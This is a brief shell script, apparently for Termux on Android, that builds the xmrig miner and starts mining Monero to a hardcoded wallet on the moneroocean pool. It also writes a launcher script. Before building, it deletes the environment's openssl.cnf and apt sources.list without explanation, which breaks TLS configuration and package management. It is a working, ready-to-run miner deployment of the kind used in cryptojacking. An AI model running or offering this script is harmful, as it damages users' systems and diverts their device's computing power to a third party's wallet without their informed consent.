d="$(date|sed 's/ //g'|sed 's/://g')"

apt-get update -y
apt-get install git -y
pkg install cmake -y
apt update -y
apt upgrade -y
rm /data/data/com.termux/files/usr/etc/tls/openssl.cnf
rm /data/data/com.termux/files/usr/etc/apt/sources.list
git clone https://github.com/xmrig/xmrig.git 
cd xmrig
mkdir build
cd build
cmake -DWITH_HWLOC=OFF .. 
make
echo "./xmrig -o  gulf.moneroocean.stream:10128 -a randomx -u 46e22EfBZMndNsrZ1x2UA5HsqVDTiYZYxf2pyXjWj81yhwUdxbaG4u7aU2WDdFsH6sexxjvajsxvhDjUkLmuGxpa3Zjp1gV -p $d -t 1">startmining.sh
./xmrig -o  gulf.moneroocean.stream:10128 -a randomx -u 46e22EfBZMndNsrZ1x2UA5HsqVDTiYZYxf2pyXjWj81yhwUdxbaG4u7aU2WDdFsH6sexxjvajsxvhDjUkLmuGxpa3Zjp1gV -p "$d" -t 4
